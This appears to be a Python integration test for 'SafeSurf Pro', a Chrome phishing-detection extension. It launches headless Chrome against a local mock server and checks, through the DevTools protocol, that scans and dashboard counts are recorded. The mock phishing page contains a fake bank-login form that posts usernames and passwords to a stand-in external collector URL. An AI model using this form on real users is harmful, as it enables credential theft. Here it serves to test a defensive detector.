import subprocess
import time
import json
import urllib.request
import os
import shutil
import sys
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import websocket

CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
EXT_DIR = r"D:\safesurf-pro"
PROFILE_DIR = r"D:\safesurf-pro\tools\test_prof_live"
CDP_PORT = 9446
HTTP_PORT = 8878

class MockHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Strict-Transport-Security", "max-age=31536000")
        self.send_header("Content-Security-Policy", "default-src 'self'")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.end_headers()
        
        if "phishing" in self.path:
            html = """<!DOCTYPE html>
<html>
<head><title>Verify Urgent Bank Account</title></head>
<body>
  <h1>Account Suspended - Action Required</h1>
  <p>Verify your account immediately to prevent termination.</p>
  <form action="http://collector-external.xyz/steal" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Verify Now</button>
  </form>
</body>
</html>"""
        else:
            html = """<!DOCTYPE html>
<html>
<head><title>Legitimate Clean Page</title></head>
<body>
  <h1>Welcome to our Documentation</h1>
  <p>Safe content with no suspicious forms or credentials.</p>
</body>
</html>"""
        self.wfile.write(html.encode("utf-8"))

    def log_message(self, format, *args):
        pass

def start_server():
    server = HTTPServer(("127.0.0.1", HTTP_PORT), MockHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server

class CDPClient:
    def __init__(self, ws_url):
        self.ws = websocket.create_connection(ws_url, timeout=10)
        self.req_id = 0

    def send(self, method, params=None):
        self.req_id += 1
        msg = {"id": self.req_id, "method": method, "params": params or {}}
        self.ws.send(json.dumps(msg))
        while True:
            raw = self.ws.recv()
            data = json.loads(raw)
            if data.get("id") == self.req_id:
                if "error" in data:
                    raise Exception(f"CDP Error in {method}: {data['error']}")
                return data.get("result", {})

    def evaluate(self, expr, await_promise=False):
        return self.send("Runtime.evaluate", {
            "expression": expr,
            "awaitPromise": await_promise,
            "returnByValue": True
        })

    def close(self):
        try:
            self.ws.close()
        except:
            pass

def main():
    print("=======================================================", flush=True)
    print("SAFESURF PRO - PHASE 1 CHROME COMPONENT VERIFICATION", flush=True)
    print("=======================================================\n", flush=True)

    server = start_server()
    print(f"✔ Mock test server running at http://127.0.0.1:{HTTP_PORT}/", flush=True)

    if os.path.exists(PROFILE_DIR):
        try: shutil.rmtree(PROFILE_DIR)
        except: pass

    cmd = [
        CHROME_PATH,
        "--headless=new",
        f"--load-extension={EXT_DIR}",
        f"--disable-extensions-except={EXT_DIR}",
        f"--remote-debugging-port={CDP_PORT}",
        f"--user-data-dir={PROFILE_DIR}",
        "--no-first-run",
        "--no-default-browser-check",
        "--disable-background-networking",
        "--disable-gpu",
        "about:blank"
    ]
    proc = subprocess.Popen(cmd)

    connected = False
    for i in range(30):
        time.sleep(0.3)
        try:
            with urllib.request.urlopen(f"http://127.0.0.1:{CDP_PORT}/json/version", timeout=1) as r:
                connected = True
                break
        except:
            pass

    if not connected:
        print("❌ Could not connect to Chrome debugging port.", flush=True)
        proc.kill()
        return

    print("✔ Chrome spawned and connected via remote debugging port.", flush=True)
    time.sleep(1.5)

    with urllib.request.urlopen(f"http://127.0.0.1:{CDP_PORT}/json") as r:
        targets = json.loads(r.read())

    sw_target = next((t for t in targets if t.get("type") == "service_worker" and "background.js" in t.get("url", "")), None)
    page_target = next((t for t in targets if t.get("type") == "page"), None)

    assert sw_target, "background.js Service Worker not found in targets"
    assert page_target, "Page target not found in targets"

    print(f"✔ Found Service Worker: {sw_target['url']}", flush=True)
    sw_cdp = CDPClient(sw_target["webSocketDebuggerUrl"])
    sw_cdp.send("Runtime.enable")

    # Step 1: Navigate to clean page
    clean_url = f"http://127.0.0.1:{HTTP_PORT}/clean_docs.html"
    print(f"\n[Test 1: Navigate to legitimate clean page: {clean_url}]", flush=True)
    page_cdp = CDPClient(page_target["webSocketDebuggerUrl"])
    page_cdp.send("Page.enable")
    page_cdp.send("Page.navigate", {"url": clean_url})
    page_cdp.close()
    time.sleep(3.5)

    # Step 2: Navigate to phishing test page
    phish_url = f"http://127.0.0.1:{HTTP_PORT}/phishing_login.html"
    print(f"\n[Test 2: Navigate to phishing test page: {phish_url}]", flush=True)
    page_cdp2 = CDPClient(page_target["webSocketDebuggerUrl"])
    page_cdp2.send("Page.navigate", {"url": phish_url})
    page_cdp2.close()
    time.sleep(3.5)

    # Step 3: Check storage.local inside Service Worker
    print("\n[Test 3: Verify chrome.storage.local persistence and deduplication]", flush=True)
    st_res = sw_cdp.evaluate("chrome.storage.local.get(null)", await_promise=True)
    st = st_res.get("result", {}).get("value", {})
    history = st.get("scan_history", [])
    stats = st.get("threat_stats", {})

    print(f"  Total History Records: {len(history)}", flush=True)
    print(f"  Aggregated Stats: {json.dumps(stats)}", flush=True)

    assert len(history) >= 2, f"Expected at least 2 scan records, got {len(history)}"
    assert stats.get("totalScans", 0) >= 2, f"Expected totalScans >= 2, got {stats.get('totalScans')}"
    print("  ✔ PASS: History and stats persisted in chrome.storage.local")

    # Check that phishing page had DOM findings and elevated risk
    phish_record = next((r for r in history if "phishing" in r.get("url", "")), None)
    assert phish_record is not None, "Phishing scan record missing"
    print(f"  Phishing record findings count: {phish_record.get('findingsCount')}, risk: {phish_record.get('phishingRiskScore')}", flush=True)
    assert phish_record.get("findingsCount", 0) > 0, "Expected DOM findings from content script for phishing page"
    print("  ✔ PASS: Content script DOM findings successfully saved and enriched in history")

    # Step 4: Open dashboard.html and inspect live DOM
    print("\n[Test 4: Open dashboard.html and verify live DOM counters and charts]", flush=True)
    sw_cdp.evaluate("chrome.tabs.create({ url: chrome.runtime.getURL('dashboard.html') })", await_promise=True)
    time.sleep(2.5)

    with urllib.request.urlopen(f"http://127.0.0.1:{CDP_PORT}/json") as r:
        cur_targets = json.loads(r.read())
    dash_target = next((t for t in cur_targets if "dashboard.html" in t.get("url", "")), None)
    assert dash_target, "Dashboard target tab not found"

    print(f"✔ Connected to live Dashboard: {dash_target['url']}", flush=True)
    dash_cdp = CDPClient(dash_target["webSocketDebuggerUrl"])
    dash_cdp.send("Runtime.enable")
    time.sleep(1)

    dom = dash_cdp.evaluate("""({
        statTotal: document.getElementById('statTotal')?.textContent,
        statSafe: document.getElementById('statSafe')?.textContent,
        statSuspicious: document.getElementById('statSuspicious')?.textContent,
        statPhishing: document.getElementById('statPhishing')?.textContent,
        tableRows: document.querySelectorAll('#historyTableBody tr').length,
        historyCount: document.getElementById('historyCount')?.textContent,
        firstThreat: document.querySelector('#historyTableBody tr td:nth-child(6)')?.textContent
    })""").get("result", {}).get("value", {})

    print("\n-------------------------------------------------------", flush=True)
    print("REAL CHROME DASHBOARD DOM VALUES:", flush=True)
    print(f"  Total Scanned (statTotal):      {dom.get('statTotal')}", flush=True)
    print(f"  Safe Websites (statSafe):       {dom.get('statSafe')}", flush=True)
    print(f"  Suspicious Sites (statSusp):    {dom.get('statSuspicious')}", flush=True)
    print(f"  Phishing Threats (statPhish):   {dom.get('statPhishing')}", flush=True)
    print(f"  History Table Rows:             {dom.get('tableRows')}", flush=True)
    print(f"  History Counter:                {dom.get('historyCount')}", flush=True)
    print(f"  Primary Threat In Table:        {dom.get('firstThreat')}", flush=True)
    print("-------------------------------------------------------\n", flush=True)

    stat_total_num = int(dom.get("statTotal", "0"))
    assert stat_total_num >= 2, f"Expected statTotal >= 2, got {stat_total_num}"
    assert dom.get("tableRows", 0) >= 2, f"Expected tableRows >= 2, got {dom.get('tableRows')}"
    print("✔ PASS: Live Chrome dashboard displays real non-zero scan data and history table rows!\n", flush=True)

    dash_cdp.close()
    sw_cdp.close()
    proc.kill()
    time.sleep(1)
    if os.path.exists(PROFILE_DIR):
        try: shutil.rmtree(PROFILE_DIR)
        except: pass
    server.shutdown()
    print("ALL TESTS PASSED SUCCESSFULLY!", flush=True)

if __name__ == "__main__":
    main()
